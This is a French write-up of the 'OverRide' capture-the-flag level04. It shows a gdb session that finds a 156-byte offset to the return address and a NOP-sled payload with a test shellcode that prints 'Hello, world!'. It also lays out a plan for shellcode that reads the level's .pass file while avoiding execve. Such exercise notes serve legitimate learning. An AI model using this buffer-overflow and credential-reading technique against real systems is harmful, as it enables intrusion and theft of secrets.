@@ -1,0 +1,104 @@
+Le programme interdit explicitement execve et par la meme system("/bin/sh")
+=> car l'exploit peux etre fait dans le processus fils mais le processus pere repere les appels a execve et kill le processus enfant
+
+Le programme utilise ptrace pour surveiller les appels système du processus fils.
+Lorsqu’un appel correspondant à une exécution est détecté, le père affiche “no exec() for you” et tue le fils.
+Cela empêche toute utilisation de execve ou system.
+Pour voir les numeros des syscall, on regarde ce fichier :
+level04@OverRide:~$ less /usr/include/asm/unistd_32.h
+#define __NR_restart_syscall      0
+#define __NR_exit                 1
+#define __NR_fork                 2
+#define __NR_read                 3
+#define __NR_write                4
+#define __NR_open                 5
+#define __NR_close                6
+#define __NR_waitpid              7
+#define __NR_creat                8
+#define __NR_link                 9
+#define __NR_unlink              10
+#define __NR_execve              11
+...
+
+En revanche, les appels open/read/write restent autorisés, ce qui permet d’exfiltrer le fichier .pass sans lancer de shell.
+
+Du coup on doit construire le shellcode pour 
+1. open("/home/users/level04/.pass", O_RDONLY) -> sys 5
+2. read(fd, buffer, size) -> sys 3
+3. write(1, buffer, size) -> sys 4
+4. exit(0) -> sys 1
+on peux trouver les syscall ici :
+https://elixir.bootlin.com/linux/v6.18.5/source/arch/x86/entry/syscalls/syscall_32.tbl
+(on peux verifier que execve n'est pas possible)
+
+On doit recuperer la taille de la chaine afin de faire un buffer overflow sur SEIP
+``` bash
+(gdb) set disassembly-flavor intel
+(gdb) disass main
+(gdb) set follow-fork-mode child
+(gdb) set detach-on-fork off
+(gdb) b *0x08048763   // On place un breakpoint juste apres le gets
+Breakpoint 1 at 0x8048763
+(gdb) r < <(python -c 'print ("A" * 400)')
+Breakpoint 1, 0x08048763 in main ()
+(gdb) x/50bx $esp
+0xffffd570:	0x90	0xd5	0xff	0xff	0x00	0x00	0x00	0x00
+0xffffd578:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd580:	0x80	0x0b	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd588:	0x14	0xc7	0xfd	0xf7	0x00	0x00	0x00	0x00
+0xffffd590:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffd598:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffd5a0:	0x41	0x41
+(gdb) p $ebp
+$15 = (void *) 0xffffd628
+(gdb) p 0xffffd628 - 0xffffd590 + 4
+$16 = 156
+(gdb) c
+Continuing.
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+```
+On a bien un buffer overflow. L'adresse du debut du buffer est 0xffffd590
+La taille du buffer pour arriver a SEIP est 156. On checke dans gdb:
+``` bash
+Starting program: /home/users/level04/level04 < <(python -c 'print ("A" * 156 + "BBBB")')
+[New process 2373]
+Give me some shellcode, k
+[Switching to process 2373]
+
+Breakpoint 1, 0x08048763 in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
+---TEST---
+On construit un shellcode juste pour tester avec un printf
+1/ Taille du Shellcode :
+➜  OverRide git:(main) ✗ echo "\xeb\x16\x59\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\xb2\x0d\xcd\x80\xb0\x01\x80\xeb\x01\xcd\x80\xe8\xe5\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21" | wc -c
+43
+
+2/ Taille du bourrage :
+taille  = 156 - 50 (NOP) - 43 (Shellcode) = 63
+2/ PAYLOAD = NOP + SHELLCODE + BOURRAGE + ADDR_SHELLCODE
+python -c 'print("\x90" * 50 + b"\xeb\x16\x59\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\xb2\x0f\xcd\x80\xb0\x01\x80\xeb\x01\xcd\x80\xe8\xe5\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21" + "A" * 63 + b"\xa0\xd5\xff\xff")' | ./level4
+
+``` bash
+(gdb) r < <(python -c 'print ("\x90" * 50 + "\xeb\x16\x59\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\xb2\x0f\xcd\x80\xb0\x01\x80\xeb\x01\xcd\x80\xe8\xe5\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21" + "A" * 64 + "\xa0\xd5\xff\xff")')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level04/level04 < <(python -c 'print ("\x90" * 50 + "\xeb\x16\x59\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\xb2\x0f\xcd\x80\xb0\x01\x80\xeb\x01\xcd\x80\xe8\xe5\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21" + "A" * 64 + "\xa0\xd5\xff\xff")')
+[New process 2436]
+Give me some shellcode, k
+[Switching to process 2436]
+
+Breakpoint 1, 0x08048763 in main ()
+(gdb) x/4bx $ebp + 4 
+0xffffd62c:	0xa0	0xd5	0xff	0xff
+(gdb) c
+Continuing.
+Hello, world!AA[Inferior 13 (process 2436) exited normally]
+(gdb) 
+```
